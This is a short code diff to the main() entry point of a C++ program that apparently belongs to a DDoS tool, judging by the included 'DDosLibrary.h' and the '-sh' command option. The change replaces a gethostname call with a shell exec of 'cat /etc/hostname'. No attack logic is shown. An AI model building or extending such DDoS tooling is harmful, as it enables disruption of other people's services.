@@ -1,6 +1,5 @@
 #include <iostream>
 #include <csignal>
-#include <zconf.h>
 #include "DDosLibrary.h"
 #include "CommandParser.h"
 #include "Utils.h"
@@ -35,10 +34,10 @@ void INTHandler(int sig) {
 int main(int argc, char *argv[]) {
     CommandParser parser;
     if (utils::cmdOptionExists(argv, argv + argc, "-sh")) {
-        char hostname[HOST_NAME_MAX];
-        gethostname(hostname, HOST_NAME_MAX);
         std::string command(utils::getCmdOption(argv, argv + argc, "-sh"));
-        std::cout << hostname << " Connected. Executing: \"" + command << "\"" << std::endl;
+        std::cout << "Connected to ";
+        utils::exec("cat /etc/hostname");
+        std::cout << "Executing: \"" + command << "\"" << std::endl;
         DDosLibrary *library = parser.parse(command);
         if (parser.hasError()) {
             if (!parser.getMessage().empty())
